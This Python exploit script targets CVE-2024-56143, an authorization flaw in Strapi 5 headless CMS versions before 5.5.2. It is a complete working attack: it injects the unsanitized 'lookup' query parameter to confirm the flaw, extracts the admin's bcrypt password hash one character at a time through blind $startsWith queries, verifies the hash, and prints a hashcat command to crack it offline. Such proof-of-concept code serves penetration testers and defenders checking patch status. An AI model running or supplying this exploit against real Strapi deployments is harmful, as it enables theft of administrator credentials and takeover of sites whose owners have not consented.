#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Strapi 5 IDOR — Blind Password Hash Extraction
# CVE            : CVE-2024-56143
# Vendor         : Strapi Solutions SAS
# Product        : Strapi (headless CMS)
# Affected       : >= 5.0.0, < 5.5.2
# Type           : CWE-639 - Authorization Bypass Through User-Controlled Key
# CVSS           : 8.2 (High)
# Platform       : Any (Node.js)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-10-16
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Strapi 5 IDOR — Blind Password Hash Extraction via lookup Parameter Injection

Demonstrates blind extraction of admin password hash (bcrypt) from Strapi 5.x
(>= 5.0.0, < 5.5.2) via the unsanitized `lookup` query parameter. The lookup
parameter is spread directly into database WHERE clauses, allowing boolean-based
blind enumeration of private field values.

ATTACK CHAIN:
  1. Confirm vulnerability by testing bcrypt prefix via lookup injection
  2. Extract full 60-char bcrypt hash character-by-character using $startsWith
  3. Verify extracted hash with $eq exact match

PREREQUISITES:
  - Strapi 5.x instance (>= 5.0.0, < 5.5.2)
  - At least one content type with public read access and published entries

REFERENCES:
  - CVE-2024-56143
  - https://github.com/strapi/strapi/security/advisories/GHSA-495j-h493-42q2
"""

import sys
import json
import string
import time
import urllib.request
import urllib.parse
import urllib.error


# Bcrypt hashes use this charset: letters, digits, '.', '/', and '$'
BCRYPT_CHARSET = "$./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
BCRYPT_LENGTH = 60  # Standard bcrypt hash length

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 1337
DEFAULT_CONTENT_TYPE = "articles"
TIMEOUT = 10


def check_lookup(base_url, relation, field, operator, value):
    """
    Send a lookup-injection request and return True if the condition matched
    (i.e., the response contained at least one data entry).

    The URL is constructed as:
        GET /api/<content_type>?lookup[<relation>][<field>][<operator>]=<value>

    If the condition matches a row in the database, Strapi returns results.
    If not, it returns an empty data array.
    """
    # Build the query parameter using bracket notation
    param_key = f"lookup[{relation}][{field}][{operator}]"
    query_string = urllib.parse.urlencode({param_key: value})
    url = f"{base_url}?{query_string}"

    try:
        req = urllib.request.Request(url, method="GET")
        req.add_header("Accept", "application/json")
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            body = json.loads(resp.read().decode())
            data = body.get("data", [])
            return len(data) > 0
    except urllib.error.HTTPError as e:
        # 400/403 could mean the parameter was blocked (patched version)
        if e.code in (400, 403):
            return False
        raise
    except (urllib.error.URLError, TimeoutError) as e:
        print(f"  [!] Connection error: {e}")
        return False


def confirm_vulnerability(base_url):
    """
    Step 1: Confirm the target is vulnerable by testing if the lookup parameter
    is processed. We check if the admin password hash starts with '$2'
    (bcrypt identifier) — this is always true for Strapi admin users.
    """
    print("[*] Step 1: Confirming vulnerability...")

    # Positive test: bcrypt hashes always start with '$2'
    positive = check_lookup(base_url, "createdBy", "password", "$startsWith", "$2")
    # Negative test: no password starts with 'ZZZZNOTREAL'
    negative = check_lookup(base_url, "createdBy", "password", "$startsWith", "ZZZZNOTREAL")

    if positive and not negative:
        print("[+] VULNERABLE! Lookup parameter injection confirmed.")
        print("    - lookup[createdBy][password][$startsWith]=$2 → returned results (match)")
        print("    - lookup[createdBy][password][$startsWith]=ZZZZNOTREAL → no results (no match)")
        return True
    elif not positive:
        print("[-] NOT VULNERABLE or no public content entries.")
        print("    The lookup parameter did not return results for a known bcrypt prefix.")
        print("    This could mean: patched version, no content entries, or wrong content type.")
        return False
    else:
        print("[?] UNEXPECTED: Both positive and negative tests returned results.")
        print("    This may indicate the content type has entries matching both conditions.")
        return False


def extract_password_hash(base_url, max_chars=BCRYPT_LENGTH):
    """
    Step 2: Extract the admin user's bcrypt password hash character-by-character
    using $startsWith operator.

    For each position, we try every character in the bcrypt charset. When a
    character makes the query return results, we know it's correct and move
    to the next position.

    A full bcrypt hash is 60 characters. Average ~32 attempts per character
    yields ~1920 HTTP requests for full extraction.
    """
    print(f"\n[*] Step 2: Extracting admin password hash (up to {max_chars} chars)...")
    print(f"    Charset: {len(BCRYPT_CHARSET)} characters")
    print(f"    Estimated requests: ~{max_chars * len(BCRYPT_CHARSET) // 2}")
    print()

    known = ""
    request_count = 0
    start_time = time.time()

    for position in range(max_chars):
        found = False
        for char in BCRYPT_CHARSET:
            test_value = known + char
            request_count += 1
            result = check_lookup(
                base_url, "createdBy", "password", "$startsWith", test_value
            )
            if result:
                known = test_value
                elapsed = time.time() - start_time
                rate = request_count / elapsed if elapsed > 0 else 0
                print(f"  [+] Position {position + 1:2d}: '{char}' → {known}  "
                      f"({request_count} reqs, {rate:.1f} req/s)")
                found = True
                break

        if not found:
            print(f"\n[*] No match at position {position + 1}. Extraction complete.")
            break

    elapsed = time.time() - start_time
    print(f"\n[*] Extraction finished in {elapsed:.1f}s ({request_count} requests)")
    return known


def verify_hash(base_url, hash_value):
    """
    Step 3: Verify the extracted hash by checking it with $eq (exact match).
    """
    print(f"\n[*] Step 3: Verifying extracted hash with $eq...")
    result = check_lookup(base_url, "createdBy", "password", "$eq", hash_value)
    if result:
        print("[+] VERIFIED: Exact match confirmed with $eq operator.")
    else:
        print("[-] WARNING: Exact match failed. Hash may be incomplete.")
    return result


def exploit(target_host, target_port, content_type):
    """
    Main exploit flow:
    1. Confirm the target is vulnerable
    2. Extract the admin password hash via blind enumeration
    3. Verify the extracted hash
    """
    base_url = f"http://{target_host}:{target_port}/api/{content_type}"

    print("=" * 70)
    print(f"  CVE-2024-56143: Strapi 5 Blind IDOR — Password Hash Extraction")
    print(f"  Target: {base_url}")
    print("=" * 70)
    print()

    # Step 1: Confirm vulnerability
    if not confirm_vulnerability(base_url):
        print("\n[!] Target does not appear vulnerable. Exiting.")
        sys.exit(1)

    # Step 2: Extract password hash
    password_hash = extract_password_hash(base_url)

    if not password_hash:
        print("\n[!] Failed to extract any characters. Exiting.")
        sys.exit(1)

    # Step 3: Verify
    verified = verify_hash(base_url, password_hash)

    # Summary
    print()
    print("=" * 70)
    print("  RESULTS")
    print("=" * 70)
    print(f"  Vulnerability:  CVE-2024-56143 (Strapi IDOR via lookup parameter)")
    print(f"  Target:         {base_url}")
    print(f"  Extracted Hash: {password_hash}")
    print(f"  Hash Length:    {len(password_hash)} characters")
    print(f"  Verified:       {'Yes' if verified else 'No'}")
    print()
    if len(password_hash) == BCRYPT_LENGTH:
        print("  [+] SUCCESS: Full bcrypt hash extracted!")
        print("      The hash can be cracked offline with hashcat (mode 3200)")
        print(f"      Command: hashcat -m 3200 '{password_hash}' wordlist.txt")
    else:
        print(f"  [~] Partial extraction: {len(password_hash)}/{BCRYPT_LENGTH} chars")
    print("=" * 70)

    return password_hash


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    content_type = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_CONTENT_TYPE
    exploit(target, port, content_type)
